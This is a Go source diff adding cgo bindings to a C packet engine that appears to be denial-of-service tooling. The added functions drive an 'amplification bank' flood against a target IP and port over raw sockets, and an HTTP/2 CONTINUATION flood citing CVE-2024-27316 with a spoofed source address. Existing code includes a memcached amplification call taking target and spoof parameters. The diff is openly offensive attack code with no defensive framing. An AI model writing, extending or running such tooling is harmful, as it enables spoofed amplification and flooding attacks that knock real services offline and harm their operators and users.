@@ -2,7 +2,7 @@ package main
 
 /*
 #cgo CFLAGS: -I${SRCDIR}/../c/include
-#cgo LDFLAGS: -L${SRCDIR}/../c/build -lpacket_sakti -ldl
+#cgo LDFLAGS: -L${SRCDIR}/../c -lpacket_sakti -ldl
 #include "engine.h"
 #include <stdlib.h>
 #include <string.h>
@@ -252,6 +252,29 @@ func MemcachedAmp(target string, spoof string, server string) error {
 	defer C.free(unsafe.Pointer(cServer))
 	C.memcached_amp(C.uint32_t(tip), C.uint32_t(sp), cServer, C.int(1), C.int(0))
 	return nil
+}
+
+/* ─── Amplification Bank (Phase 1) ─── */
+
+func AmpBankInit(targetIP uint32, targetPort uint16) error {
+	C.amp_bank_init(C.int(C.get_raw_socket()), C.uint32_t(targetIP), C.uint16_t(targetPort))
+	return nil
+}
+
+func AmpBankFlood(protos int, packets int) int {
+	return int(C.amp_bank_flood(C.int(C.get_raw_socket()), C.int(protos), C.int(packets)))
+}
+
+func AmpBankFloodAll(packets int) int {
+	return int(C.amp_bank_flood_all(C.int(C.get_raw_socket()), C.int(packets)))
+}
+
+func AmpBankProtocolCount() int { return int(C.amp_bank_count()) }
+
+/* ─── H2 CONTINUATION flood (CVE-2024-27316, Phase 2) ─── */
+
+func H2ContinuationFlood(targetIP uint32, targetPort uint16, spoofIP uint32, streams int, duration int) int {
+	return int(C.h2_continuation_loop(C.uint32_t(targetIP), C.uint16_t(targetPort), C.uint32_t(spoofIP), C.int(streams), C.int(duration)))
 }
 
 var packetErrPtr unsafe.Pointer
